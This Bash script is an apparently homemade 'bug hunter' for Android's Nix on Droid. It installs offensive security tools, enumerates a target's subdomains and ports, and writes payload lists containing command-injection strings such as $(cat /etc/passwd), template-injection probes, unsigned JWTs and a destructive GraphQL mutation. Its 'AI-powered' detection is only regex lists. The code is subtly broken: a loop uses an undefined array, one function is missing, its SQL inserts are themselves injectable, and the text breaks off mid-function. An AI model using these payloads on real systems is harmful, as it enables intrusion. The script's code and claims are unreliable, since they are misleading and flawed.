#!/usr/bin/env bash

# ============================================
# CRITICAL BUG HUNTER PRO - ULTIMATE EDITION
# ============================================
# Advanced scanner untuk bug critical dengan AI-powered detection
# Hanya untuk pentesting legal dengan izin tertulis
# ============================================

# Security and optimization settings
set -uo pipefail
trap 'handle_error $LINENO' ERR
trap cleanup EXIT SIGINT SIGTERM

# Enhanced Configuration
VERSION="4.0"
AUTHOR="Ethical Security Team"
DATE=$(date +"%Y-%m-%d")
LAST_UPDATE="2024-12-31"

# Colors
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
NC='\033[0m'
BOLD='\033[1m'

# Directories untuk Nix on Droid
TOOL_DIR="$HOME/.critical-tools"
RESULTS_DIR="$HOME/.bug-hunter/results"
WORDLISTS_DIR="$HOME/.bug-hunter/wordlists"
CONFIG_DIR="$HOME/.config/bug-hunter-pro"
TEMP_DIR="/tmp/bug-hunter-$(date +%s)"
LOG_FILE="$CONFIG_DIR/execution_$(date +%Y%m%d).log"
PERF_LOG="$CONFIG_DIR/performance.log"
DB_FILE="$CONFIG_DIR/findings.db"
CACHE_DIR="$CONFIG_DIR/cache"
PLUGIN_DIR="$CONFIG_DIR/plugins"

# Global Variables
TARGET=""
SCOPE=""
OUTPUT_DIR=""
CURRENT_SCAN_ID=""
SCAN_MODE="full"
THREADS=10
TIMEOUT=30
MAX_SUBDOMAINS=5000
MAX_URLS=10000
API_KEYS=""
COLLABORATOR=""
PROXY=""
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

# AI Detection Patterns
RCE_PATTERNS=("system\(" "exec\(" "shell_exec\(" "passthru\(" "popen\(" "proc_open\(" "eval\(" "assert\(")
SQLI_PATTERNS=("mysql_query" "mysqli_query" "pg_query" "sqlite_query" "SELECT.*FROM" "UNION.*SELECT")
XXE_PATTERNS=("DOMDocument" "SimpleXML" "xml_parse" "loadXML" "LIBXML_NOENT")
SSRF_PATTERNS=("curl_exec" "file_get_contents" "fsockopen" "socket_create")
LFI_PATTERNS=("include\(" "require\(" "include_once\(" "require_once\(")
JWT_PATTERNS=("eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*\.[A-Za-z0-9._-]*")

# Safe command wrappers
safe_grep() {
    if command -v grep &> /dev/null; then
        grep "$@"
    else
        # Simple grep alternative using awk/sed
        if command -v awk &> /dev/null; then
            awk "$@" 2>/dev/null || cat
        else
            cat
        fi
    fi
}

safe_curl() {
    if command -v curl &> /dev/null; then
        curl "$@"
    else
        echo "[!] curl not available" >&2
        return 1
    fi
}

safe_wget() {
    if command -v wget &> /dev/null; then
        wget "$@"
    else
        echo "[!] wget not available" >&2
        return 1
    fi
}

# ============================================
# ENHANCED UTILITY FUNCTIONS
# ============================================

handle_error() {
    local line=$1
    echo -e "${RED}[ERROR] Script failed at line $line${NC}" | tee -a "$LOG_FILE"
    echo "Stack trace:" | tee -a "$LOG_FILE"
    local i=0
    while caller $i; do
        ((i++))
    done | tee -a "$LOG_FILE"
    cleanup
    exit 1
}

init_setup() {
    echo -e "${CYAN}[*] Initializing Critical Bug Hunter Pro v$VERSION${NC}"
    
    # Create necessary directories
    mkdir -p $TOOL_DIR $RESULTS_DIR $WORDLISTS_DIR $CONFIG_DIR $CACHE_DIR $TEMP_DIR $PLUGIN_DIR
    mkdir -p $TOOL_DIR/bin $TOOL_DIR/lib

    # Setup storage untuk Nix on Droid
    check_storage_permission

    # Setup environment variables
    export PATH="$PATH:$TOOL_DIR/bin:$HOME/go/bin:$TOOL_DIR:/usr/local/bin:/usr/bin:/bin:/data/data/com.termux.nix/files/usr/bin"
    export GOPATH="$HOME/go"
    export GOBIN="$HOME/go/bin"
    if [ -z "${PYTHONPATH:-}" ]; then
        export PYTHONPATH="$TOOL_DIR"
    else
        export PYTHONPATH="$PYTHONPATH:$TOOL_DIR"
    fi

    # Load configuration
    load_config

    # Setup logging (simple version without tee if not available)
    setup_logging

    # Optimize environment untuk Nix on Droid
    optimize_nixodroid

    echo -e "${GREEN}[√] Environment initialized${NC}"
}

check_storage_permission() {
    # Untuk Nix on Droid, akses storage mungkin berbeda
    echo -e "${YELLOW}[!] Checking storage permissions...${NC}"

    # Coba akses Android storage
    local android_storage="/storage/emulated/0"
    local termux_storage="/data/data/com.termux/files/home/storage"

    if [ -d "$android_storage" ] && [ ! -w "$android_storage" ]; then
        echo -e "${YELLOW}[!] Storage permission needed for external storage${NC}"
        echo -e "${CYAN}[*] Tips Nix on Droid:${NC}"
        echo -e "1. Grant storage permission via Android settings"
        echo -e "2. Using internal storage: $HOME"
    elif [ -d "$termux_storage" ]; then
        echo -e "${YELLOW}[!] Detected Termux storage path${NC}"
        echo -e "${CYAN}[*] Creating symlink...${NC}"
        ln -sf "$termux_storage" "$HOME/storage" 2>/dev/null || true
    fi

    # Create work directory di home
    mkdir -p "$HOME/bughunter_work"
}

load_config() {
    local config_file="$CONFIG_DIR/config.cfg"

    if [ -f "$config_file" ]; then
        source "$config_file"
        echo -e "${GREEN}[√] Configuration loaded${NC}"
    else
        # Create default config
        cat > "$config_file" << EOF
# Critical Bug Hunter Pro Configuration
THREADS=10
TIMEOUT=30
MAX_SUBDOMAINS=5000
MAX_URLS=10000
API_KEYS=""
COLLABORATOR=""
PROXY=""
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
WORDLISTS_DIR="$HOME/.bug-hunter/wordlists"
RATE_LIMIT=100
SCAN_DEPTH=3
EOF
        echo -e "${YELLOW}[!] Default configuration created${NC}"
    fi

    # Load API keys if exists
    if [ -f "$CONFIG_DIR/api_keys.env" ]; then
        source "$CONFIG_DIR/api_keys.env"
    fi
}

setup_logging() {
    # Simple logging without advanced features
    if [ -f "$LOG_FILE" ]; then
        # Rotate if too large (simplified check)
        if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
            local size=$(wc -c < "$LOG_FILE" 2>/dev/null || echo 0)
            if [ $size -gt 1000000 ]; then
                mv "$LOG_FILE" "$LOG_FILE.old" 2>/dev/null || true
            fi
        fi
    fi
    
    echo "=== Log started at $(date) ===" >> "$LOG_FILE" 2>/dev/null || true
}

optimize_nixodroid() {
    echo -e "${CYAN}[*] Optimizing Nix on Droid environment...${NC}"

    # Increase file descriptors
    ulimit -n 8192 2>/dev/null || true

    # Setup swap for better performance (skip if not enough space)
    setup_swap

    # Optimize performance untuk Nix on Droid
    echo -e "${YELLOW}[+] Setting performance parameters...${NC}"

    # Set CPU governor to performance if possible
    if [ -w /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor ] 2>/dev/null; then
        echo performance > /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor 2>/dev/null || true
    fi

    # Create work directory
    mkdir -p "$HOME/bughunter_work"
    ln -sf "$HOME/bughunter_work" "$HOME/work" 2>/dev/null || true

    # Setup Nix environment
    setup_nix_environment
}

setup_nix_environment() {
    echo -e "${BLUE}[+] Setting up Nix environment...${NC}"

    # Ensure Nix is properly initialized
    if [ ! -f "$HOME/.nix-profile/etc/profile.d/nix.sh" ]; then
        echo -e "${YELLOW}[!] Nix environment not fully initialized${NC}"
        echo -e "${CYAN}[*] Run: source ~/.nix-profile/etc/profile.d/nix.sh${NC}"
    fi

    # Add Nix binaries to PATH
    if [ -d "$HOME/.nix-profile/bin" ]; then
        export PATH="$HOME/.nix-profile/bin:$PATH"
    fi
}

setup_swap() {
    local swap_file="$HOME/swapfile"
    local swap_size="1024"  # 1GB

    if ! grep -q swap /proc/swaps 2>/dev/null; then
        echo -e "${YELLOW}[+] Creating swap file...${NC}"

        # Check available space
        local available_space=$(df "$HOME" 2>/dev/null | awk 'NR==2 {print $4}' 2>/dev/null || echo 0)
        if [ "$available_space" -lt $((swap_size * 1024)) ]; then
            echo -e "${RED}[!] Not enough space for swap${NC}"
            return 1
        fi

        # Create swap file
        dd if=/dev/zero of="$swap_file" bs=1M count=$swap_size status=progress 2>/dev/null
        chmod 600 "$swap_file"
        mkswap "$swap_file" 2>/dev/null
        swapon "$swap_file" 2>/dev/null

        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[√] Swap activated: ${swap_size}MB${NC}"
        else
            echo -e "${YELLOW}[!] Swap activation failed${NC}"
            rm -f "$swap_file"
        fi
    fi
}

auto_update_script() {
    # Skip update check if curl not available
    if ! command -v curl &> /dev/null; then
        echo -e "${YELLOW}[!] Update check skipped (curl not available)${NC}"
        return
    fi
    
    local repo_url="https://raw.githubusercontent.com/ethical-security/bug-hunter-pro/main/bug-hunter.sh"
    local update_check_file="$CONFIG_DIR/last_update_check"
    local current_time=$(date +%s 2>/dev/null || echo 0)
    local last_check=0

    # Check if we should check for updates (once per week)
    if [ -f "$update_check_file" ]; then
        last_check=$(cat "$update_check_file" 2>/dev/null || echo 0)
    fi

    local one_week=604800
    if [ $((current_time - last_check)) -gt $one_week ]; then
        echo -e "${CYAN}[*] Checking for updates...${NC}"
        
        # Simple version check - just compare version numbers
        local latest_version=$(curl -s -H "Cache-Control: no-cache" "$repo_url" 2>/dev/null | 
            head -20 | grep -i "version=" 2>/dev/null | head -1 | cut -d'"' -f2 || echo "")
        
        if [ ! -z "$latest_version" ] && [ "$latest_version" != "$VERSION" ]; then
            echo -e "${YELLOW}[!] New version available: $latest_version${NC}"
            echo -e "${CYAN}[*] Current version: $VERSION${NC}"
            echo -e "${YELLOW}[*] Please download latest version from GitHub${NC}"
        fi
        
        echo "$current_time" > "$update_check_file" 2>/dev/null || true
    fi
}

log_action() {
    local message="$1"
    local level="${2:-INFO}"
    local timestamp=$(date +'%Y-%m-%d %H:%M:%S')

    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"

    # Also log to performance log if relevant
    if [[ "$level" == "PERF" ]] || [[ "$message" == *"completed in"* ]]; then
        echo "[$timestamp] $message" >> "$PERF_LOG"
    fi
}

log_performance() {
    local task="$1"
    local start_time="$2"
    local end_time=$(date +%s)
    local duration=$((end_time - start_time))

    SCAN_STATS+=("$task:$duration")
    log_action "$task completed in ${duration}s" "PERF"

    # Show progress if interactive
    if [ -t 1 ]; then
        echo -e "${GREEN}[√] $task completed (${duration}s)${NC}"
    fi
}

progress_bar() {
    local duration="$1"
    local message="${2:-Processing}"
    local width=50

    echo -ne "${BLUE}[*] $message [${NC}"

    for ((i=0; i<width; i++)); do
        echo -ne "#"
        sleep $(awk "BEGIN {print $duration/$width}" 2>/dev/null || echo 0.1)
    done

    echo -e "${BLUE}]${NC}"
}

check_dependencies() {
    echo -e "${YELLOW}[*] Checking dependencies...${NC}"
    
    local deps=("curl" "git" "python3" "nmap" "jq" "sqlite3")
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}[!] Missing dependencies: ${missing[*]}${NC}"
        echo -e "${CYAN}[*] You can install them later via option 1 in main menu${NC}"
        return 1
    fi
    
    echo -e "${GREEN}[√] Basic dependencies available${NC}"
    return 0
}

# ============================================
# DATABASE FUNCTIONS
# ============================================

init_database() {
    if ! command -v sqlite3 &> /dev/null; then
        echo -e "${YELLOW}[!] Installing sqlite via Nix...${NC}"
        nix profile install nixpkgs#sqlite 2>/dev/null || true
    fi

    sqlite3 "$DB_FILE" << 'EOF'
CREATE TABLE IF NOT EXISTS scans (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    scan_id TEXT UNIQUE,
    target TEXT,
    start_time TEXT,
    end_time TEXT,
    status TEXT,
    findings_count INTEGER DEFAULT 0
);

CREATE TABLE IF NOT EXISTS findings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    scan_id TEXT,
    vulnerability TEXT,
    severity TEXT,
    url TEXT,
    parameter TEXT,
    payload TEXT,
    description TEXT,
    timestamp TEXT,
    FOREIGN KEY (scan_id) REFERENCES scans (scan_id)
);

CREATE TABLE IF NOT EXISTS targets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    domain TEXT UNIQUE,
    last_scan TEXT,
    subdomains_count INTEGER DEFAULT 0,
    vulnerabilities_count INTEGER DEFAULT 0
);

CREATE TABLE IF NOT EXISTS wordlists (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT UNIQUE,
    type TEXT,
    size INTEGER,
    last_used TEXT
);

CREATE INDEX IF NOT EXISTS idx_scan_id ON findings (scan_id);
CREATE INDEX IF NOT EXISTS idx_severity ON findings (severity);
CREATE INDEX IF NOT EXISTS idx_vulnerability ON findings (vulnerability);
EOF

    echo -e "${GREEN}[√] Database initialized${NC}"
}

save_scan() {
    local scan_id="$1"
    local target="$2"
    local status="$3"
    local findings_count="$4"

    sqlite3 "$DB_FILE" << EOF
INSERT OR REPLACE INTO scans (scan_id, target, start_time, end_time, status, findings_count)
VALUES ('$scan_id', '$target', datetime('now'), datetime('now'), '$status', $findings_count);
EOF
}

save_finding() {
    local scan_id="$1"
    local vulnerability="$2"
    local severity="$3"
    local url="$4"
    local parameter="$5"
    local payload="$6"
    local description="$7"

    sqlite3 "$DB_FILE" << EOF
INSERT INTO findings (scan_id, vulnerability, severity, url, parameter, payload, description, timestamp)
VALUES ('$scan_id', '$vulnerability', '$severity', '$url', '$parameter', '$payload', '$description', datetime('now'));
EOF
}

get_statistics() {
    echo -e "${CYAN}[*] Database Statistics:${NC}"

    sqlite3 "$DB_FILE" << 'EOF'
.mode column
.headers on

SELECT
    (SELECT COUNT(*) FROM scans) as total_scans,
    (SELECT COUNT(*) FROM findings) as total_findings,
    (SELECT COUNT(DISTINCT target) FROM scans) as unique_targets,
    (SELECT COUNT(*) FROM findings WHERE severity = 'CRITICAL') as critical_findings,
    (SELECT COUNT(*) FROM findings WHERE severity = 'HIGH') as high_findings;

SELECT
    vulnerability,
    COUNT(*) as count,
    severity
FROM findings
GROUP BY vulnerability, severity
ORDER BY count DESC
LIMIT 10;
EOF
}

# ============================================
# PLUGIN SYSTEM
# ============================================

load_plugins() {
    echo -e "${CYAN}[*] Loading plugins...${NC}"

    for plugin in "$PLUGIN_DIR"/*.sh; do
        if [ -f "$plugin" ]; then
            source "$plugin"
            local plugin_name=$(basename "$plugin" .sh)
            echo -e "${GREEN}[√] Loaded plugin: $plugin_name${NC}"
            log_action "Plugin loaded: $plugin_name"
        fi
    done

    # Load built-in plugins
    load_builtin_plugins
}

load_builtin_plugins() {
    # Plugin: Rate limiter
    rate_limit() {
        local max_requests="${1:-100}"
        local interval="${2:-60}"
        local request_count=0
        local start_time=$(date +%s)

        return 0  # Placeholder
    }

    # Plugin: False positive filter
    filter_false_positives() {
        local finding="$1"

        # Common false positive patterns
        local false_patterns=(
            "test"
            "example"
            "localhost"
            "127.0.0.1"
            "dummy"
            "placeholder"
        )

        for pattern in "${false_patterns[@]}"; do
            if [[ "$finding" == *"$pattern"* ]]; then
                return 1
            fi
        done

        return 0
    }

    # Plugin: Notification system
    send_notification() {
        local message="$1"
        local severity="$2"

        # In-app notification
        echo -e "${RED}🚨 NOTIFICATION: $message${NC}"

        # Log notification
        log_action "Notification sent: $message" "NOTIFY"

        # Could be extended to email/discord/etc
        if [ -f "$CONFIG_DIR/notifications.cfg" ]; then
            source "$CONFIG_DIR/notifications.cfg"
            # Add notification channels here
        fi
    }

    export -f rate_limit filter_false_positives send_notification
}

# ============================================
# ADVANCED TOOLS INSTALLATION (OPTIMIZED untuk Nix)
# ============================================

install_pro_tools() {
    local start_time=$(date +%s)
    echo -e "${PURPLE}[*] Installing Professional Bug Hunting Suite${NC}"

    # Update Nix packages
    echo -e "${BLUE}[+] Updating Nix packages...${NC}"
    nix-channel --update 2>/dev/null || true

    # Install essential packages in batches
    install_essential_packages
    install_python_packages
    install_nodejs_tools
    install_go_tools_optimized
    install_specialized_tools
    download_wordlists_parallel

    log_performance "Tools installation" "$start_time"
    echo -e "${GREEN}[√] Professional tools installation completed${NC}"
}

install_essential_packages() {
    echo -e "${BLUE}[+] Installing essential packages...${NC}"
    
    # Daftar paket dengan metode instalasi berbeda
    local packages_basic="python3 nodejs git wget curl nmap jq sqlite whois dnsutils"
    local packages_advanced="php ruby go clang make cmake hydra sqlmap nikto openssh"
    local packages_libs="libxslt libxml2 libcurl libffi openssl rust binutils"
    
    echo -e "${YELLOW}[*] Installing basic packages...${NC}"
    for pkg in $packages_basic; do
        echo -e "  -> $pkg"
        nix-shell -p "$pkg" --run "echo '  ✓ $pkg'" 2>/dev/null || true
    done
    
    echo -e "${YELLOW}[*] Installing advanced packages...${NC}"
    for pkg in $packages_advanced; do
        echo -e "  -> $pkg"
        nix-shell -p "$pkg" --run "echo '  ✓ $pkg'" 2>/dev/null || true
    done
    
    echo -e "${YELLOW}[*] Installing library packages...${NC}"
    for pkg in $packages_libs; do
        echo -e "  -> $pkg"
        nix-shell -p "$pkg" --run "echo '  ✓ $pkg'" 2>/dev/null || true
    done
    
    echo -e "${GREEN}[√] Package installation attempt completed${NC}"
    echo -e "${YELLOW}[!] Note: Some packages may require manual installation${NC}"
}

install_python_packages() {
    echo -e "${BLUE}[+] Installing Python security packages...${NC}"
    pip3 install --upgrade pip setuptools wheel 2>/dev/null || true

    local py_packages=(
        requests beautifulsoup4 lxml selenium pillow
        pycryptodome paramiko colorama termcolor argparse urllib3
        cryptography pandas numpy scrapy flask fastapi
        mitmproxy pyjwt xmltodict pyyaml jinja2
        pyfiglet prompt_toolkit rich
    )

    for package in "${packages[@]}"; do
        echo -e "${YELLOW}[*] Installing $package...${NC}"
        # Try multiple installation methods
        nix-env -i "$package" 2>/dev/null || \
        nix profile install "nixpkgs#$package" 2>/dev/null || \
        nix-shell -p "$package" --run "echo installed" 2>/dev/null || true
    done
}

install_go_tools_optimized() {
    echo -e "${BLUE}[+] Installing Go security tools...${NC}"

    # Ensure Go is installed
    if ! command -v go &> /dev/null; then
        echo -e "${YELLOW}[!] Installing Go...${NC}"
        nix profile install nixpkgs#go 2>/dev/null || true
    fi

    # Array of tools with their GitHub paths
    declare -A go_tools=(
        ["nuclei"]="projectdiscovery/nuclei/v2/cmd/nuclei"
        ["subfinder"]="projectdiscovery/subfinder/v2/cmd/subfinder"
        ["httpx"]="projectdiscovery/httpx/cmd/httpx"
        ["naabu"]="projectdiscovery/naabu/v2/cmd/naabu"
        ["dnsx"]="projectdiscovery/dnsx/cmd/dnsx"
        ["katana"]="projectdiscovery/katana/cmd/katana"
        ["interactsh-client"]="projectdiscovery/interactsh/cmd/interactsh-client"
        ["ffuf"]="ffuf/ffuf"
        ["gau"]="lc/gau/v2/cmd/gau"
        ["waybackurls"]="tomnomnom/waybackurls"
        ["gospider"]="jaeles-project/gospider"
        ["dalfox"]="hahwul/dalfox/v2"
        ["gowitness"]="sensepost/gowitness"
        ["subjack"]="haccer/subjack"
    )

    # Install tools
    for tool in "${!go_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            echo -e "${YELLOW}[*] Installing $tool...${NC}"
            go install -v "github.com/${go_tools[$tool]}@latest" 2>&1 | grep -v "deprecated" || true
        fi
    done

    # Copy binaries to PATH
    if [ -d "$HOME/go/bin" ]; then
        cp "$HOME/go/bin/"* "$TOOL_DIR/bin/" 2>/dev/null || true
        chmod +x "$TOOL_DIR/bin/"* 2>/dev/null || true
    fi
}

install_specialized_tools() {
    cd "$TOOL_DIR"

    local tools=(
        "https://github.com/s0md3v/XSStrike.git|XSStrike|pip3 install -r requirements.txt"
        "https://github.com/s0md3v/Arjun.git|Arjun|"
        "https://github.com/m4ll0k/SecretFinder.git|SecretFinder|pip3 install -r requirements.txt"
        "https://github.com/GerbenJavado/LinkFinder.git|LinkFinder|pip3 install -r requirements.txt"
        "https://github.com/assetnote/core-stuff.git|core-stuff|"
        "https://github.com/obheda12/GitDorker.git|GitDorker|pip3 install -r requirements.txt"
    )

    for tool_spec in "${tools[@]}"; do
        IFS='|' read -r url name install_cmd <<< "$tool_spec"

        if [ ! -d "$name" ]; then
            echo -e "${YELLOW}[+] Installing $name...${NC}"
            git clone "$url" "$name" 2>/dev/null || true

            if [ ! -z "$install_cmd" ] && [ -f "$name/requirements.txt" ]; then
                cd "$name"
                eval "$install_cmd" 2>/dev/null || true
                cd "$TOOL_DIR"
            fi
        fi
    done

    # Install feroxbuster via cargo jika ada
    if command -v cargo &> /dev/null; then
        if ! command -v feroxbuster &> /dev/null; then
            echo -e "${YELLOW}[+] Installing feroxbuster...${NC}"
            cargo install feroxbuster 2>/dev/null || true
        fi
    fi
}

download_wordlists_parallel() {
    echo -e "${YELLOW}[+] Downloading advanced wordlists...${NC}"

    # Download wordlists in parallel
    (
        git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$WORDLISTS_DIR/PayloadsAllTheThings" 2>/dev/null || true
    ) &

    (
        git clone --depth 1 https://github.com/danielmiessler/SecLists.git "$WORDLISTS_DIR/SecLists" 2>/dev/null || true
    ) &

    (
        git clone --depth 1 https://github.com/fuzzdb-project/fuzzdb.git "$WORDLISTS_DIR/fuzzdb" 2>/dev/null || true
    ) &

    wait

    # Download additional wordlists
    wget -q -O "$WORDLISTS_DIR/api.txt" \
        "https://wordlists-cdn.assetnote.io/data/automated/httparchive_apiroutes_2023_06_28.txt" 2>/dev/null || true &

    wget -q -O "$WORDLISTS_DIR/params.txt" \
        "https://wordlists-cdn.assetnote.io/data/automated/httparchive_parameters_2023_06_28.txt" 2>/dev/null || true &

    wget -q -O "$WORDLISTS_DIR/javascript.txt" \
        "https://wordlists-cdn.assetnote.io/data/automated/httparchive_js_2023_06_28.txt" 2>/dev/null || true &

    wait

    create_custom_wordlists
}

create_custom_wordlists() {
    echo -e "${BLUE}[+] Creating custom payloads...${NC}"

    # RCE payloads
    cat > "$WORDLISTS_DIR/rce_custom.txt" << 'EOF'
{{constructor.constructor('alert(1)')()}}
${7*7}
{{7*7}}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
@{7*7}
~{7*7}
^{7*7}
`id`
$(id)
`whoami`
$(whoami)
;id;
|id
||id
&&id
&id
`cat /etc/passwd`
$(cat /etc/passwd)
EOF

    # JWT testing payloads
    cat > "$WORDLISTS_DIR/jwt_tests.txt" << 'EOF'
eyJhbGciOiJub25eIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.
EOF

    # GraphQL payloads
    cat > "$WORDLISTS_DIR/graphql.txt" << 'EOF'
query { __schema { types { name fields { name } } } }
mutation { deleteUser(id: "1") { id } }
{ __typename }
query { user(id: "1") { id } }
EOF

    # Create database entries for wordlists
    for wordlist in "$WORDLISTS_DIR"/*.txt; do
        if [ -f "$wordlist" ]; then
            local name=$(basename "$wordlist")
            local size=$(wc -l < "$wordlist" 2>/dev/null || echo 0)
            sqlite3 "$DB_FILE" << EOF
INSERT OR IGNORE INTO wordlists (name, type, size, last_used)
VALUES ('$name', 'custom', $size, datetime('now'));
EOF
        fi
    done
}

# ============================================
# INTELLIGENT RECONNAISSANCE (PARALLEL)
# ============================================

advanced_recon() {
    local target=$1
    local start_time=$(date +%s)

    echo -e "${PURPLE}[*] Starting Intelligent Reconnaissance${NC}"
    mkdir -p "$OUTPUT_DIR/recon"

    # Check for wildcard DNS
    check_wildcard_dns "$target"

    # Run reconnaissance in parallel
    parallel_reconnaissance "$target"

    # Process results
    process_recon_results

    log_performance "Reconnaissance" "$start_time"
    echo -e "${GREEN}[√] Reconnaissance completed${NC}"
}

check_wildcard_dns() {
    local domain=$1
    local random_sub=$(head /dev/urandom 2>/dev/null | tr -dc 'a-z0-9' 2>/dev/null | fold -w 20 2>/dev/null | head -n1 2>/dev/null || echo "test123")

    echo -e "${YELLOW}[+] Checking for wildcard DNS...${NC}"

    if host "$random_sub.$domain" &>/dev/null; then
        echo -e "${RED}[!] Wildcard DNS detected on $domain${NC}"
        echo "WILDCARD_DNS=true" > "$OUTPUT_DIR/recon/wildcard.info"
        return 1
    else
        echo -e "${GREEN}[√] No wildcard DNS detected${NC}"
        return 0
    fi
}

parallel_reconnaissance() {
    local target=$1

    # 1. Subdomain enumeration (parallel)
    echo -e "${BLUE}[+] Enumerating subdomains...${NC}"

    if command -v subfinder &> /dev/null; then
        subfinder -d "$target" -silent -o "$OUTPUT_DIR/recon/subfinder.txt" &
    fi

    if command -v assetfinder &> /dev/null; then
        assetfinder --subs-only "$target" 2>/dev/null > "$OUTPUT_DIR/recon/assetfinder.txt" &
    fi

    if command -v amass &> /dev/null; then
        amass enum -passive -d "$target" -o "$OUTPUT_DIR/recon/amass.txt" &
    fi

    # GitHub subdomains (if token available)
    if [ ! -z "$GITHUB_TOKEN" ] && command -v github-subdomains &> /dev/null; then
        github-subdomains -d "$target" -t "$GITHUB_TOKEN" > "$OUTPUT_DIR/recon/github.txt" &
    fi

    wait

    # 2. DNS information
    echo -e "${BLUE}[+] Gathering DNS information...${NC}"
    dig "$target" ANY 2>/dev/null > "$OUTPUT_DIR/recon/dns_info.txt" &
    whois "$target" 2>/dev/null > "$OUTPUT_DIR/recon/whois.txt" &

    # 3. Port scanning (limited to top ports)
    echo -e "${BLUE}[+] Scanning ports...${NC}"
    if command -v naabu &> /dev/null; then
        naabu -host "$target" -top-ports 100 -silent -o "$OUTPUT_DIR/recon/ports.txt" &
    elif command -v nmap &> /dev/null; then
        nmap -T4 -F "$target" -oN "$OUTPUT_DIR/recon/ports.txt" 2>/dev/null &
    fi

    wait
}

process_recon_results() {
    # Combine subdomains
    cat "$OUTPUT_DIR"/recon/*.txt 2>/dev/null | grep -v "^$" | sort -u | head -n $MAX_SUBDOMAINS > "$OUTPUT_DIR/recon/all_subdomains.txt" 2>/dev/null || true

    local subdomain_count=$(wc -l < "$OUTPUT_DIR/recon/all_subdomains.txt" 2>/dev/null || echo 0)
    echo -e "${GREEN}[√] Found $subdomain_count subdomains${NC}"

    # Check alive domains
    if command -v httpx &> /dev/null && [ -s "$OUTPUT_DIR/recon/all_subdomains.txt" ]; then
        echo -e "${BLUE}[+] Checking alive domains...${NC}"
        httpx -l "$OUTPUT_DIR/recon/all_subdomains.txt" -silent -status-code -title \
            -o "$OUTPUT_DIR/recon/alive_domains.txt" 2>/dev/null || true
    else
        # Basic alive check
        echo -e "${YELLOW}[!] Using basic alive check...${NC}"
        while read -r domain; do
            if curl -s -m 5 "$domain" > /dev/null 2>&1; then
                echo "$domain" >> "$OUTPUT_DIR/recon/alive_domains.txt"
            fi
        done < "$OUTPUT_DIR/recon/all_subdomains.txt" 2>/dev/null || true
    fi

    local alive_count=$(wc -l < "$OUTPUT_DIR/recon/alive_domains.txt" 2>/dev/null || echo 0)
    echo -e "${GREEN}[√] $alive_count domains are alive${NC}"

    # URL discovery
    echo -e "${BLUE}[+] Discovering URLs...${NC}"

    # Use parallel processing for URL discovery
    if command -v waybackurls &> /dev/null && [ -s "$OUTPUT_DIR/recon/alive_domains.txt" ]; then
        cat "$OUTPUT_DIR/recon/alive_domains.txt" | waybackurls 2>/dev/null > "$OUTPUT_DIR/recon/wayback_urls.txt" &
    fi

    if command -v gau &> /dev/null && [ -s "$OUTPUT_DIR/recon/alive_domains.txt" ]; then
        cat "$OUTPUT_DIR/recon/alive_domains.txt" | gau 2>/dev/null > "$OUTPUT_DIR/recon/gau_urls.txt" &
    fi

    # Spidering with rate limiting
    if command -v gospider &> /dev/null && [ -s "$OUTPUT_DIR/recon/alive_domains.txt" ]; then
        gospider -S "$OUTPUT_DIR/recon/alive_domains.txt" -o "$OUTPUT_DIR/recon/spider" -c 5 -d 1 -t 10 2>/dev/null &
    fi

    wait 2>/dev/null || true

    # Combine URLs
    cat "$OUTPUT_DIR"/recon/*urls.txt "$OUTPUT_DIR"/recon/spider/*.txt 2>/dev/null | \
        sort -u | head -n $MAX_URLS > "$OUTPUT_DIR/recon/all_urls.txt" 2>/dev/null || true

    local url_count=$(wc -l < "$OUTPUT_DIR/recon/all_urls.txt" 2>/dev/null || echo 0)
    echo -e "${GREEN}[√] Discovered $url_count URLs${NC}"

    # Parameter extraction jika Arjun ada
    if command -v arjun &> /dev/null && [ -s "$OUTPUT_DIR/recon/all_urls.txt" ]; then
        echo -e "${BLUE}[+] Extracting parameters...${NC}"
        cat "$OUTPUT_DIR/recon/all_urls.txt" | grep "?" | cut -d"?" -f1 | sort -u | \
            while read -r url; do
                python3 "$TOOL_DIR/Arjun/arjun.py" -u "$url" -oT "$OUTPUT_DIR/recon/arjun_tmp.json" --silent 2>/dev/null || true
            done

        # Convert Arjun output to readable format
        if [ -f "$OUTPUT_DIR/recon/arjun_tmp.json" ] && command -v jq &> /dev/null; then
            jq -r '.results[] | "\(.url) - Parameters: \(.params | keys | join(", "))"' \
                "$OUTPUT_DIR/recon/arjun_tmp.json" 2>/dev/null > "$OUTPUT_DIR/recon/parameters.txt" || true
        fi
    fi
}

# ============================================
# AI-POWERED VULNERABILITY SCANNING
# ============================================

ai_scan_rce() {
    local target=$1
    local start_time=$(date +%s)

    echo -e "${RED}[*] AI-Powered RCE Detection${NC}"
    mkdir -p "$OUTPUT_DIR/rce"

    # Use parallel processing for RCE tests
    parallel_rce_tests "$target"

    # Advanced deserialization tests
    test_deserialization "$target"

    log_performance "RCE Scanning" "$start_time"
}

parallel_rce_tests() {
    local target=$1

    # Test command injection
    echo -e "${BLUE}[+] Testing command injection points...${NC}"

    # Find potential injection points
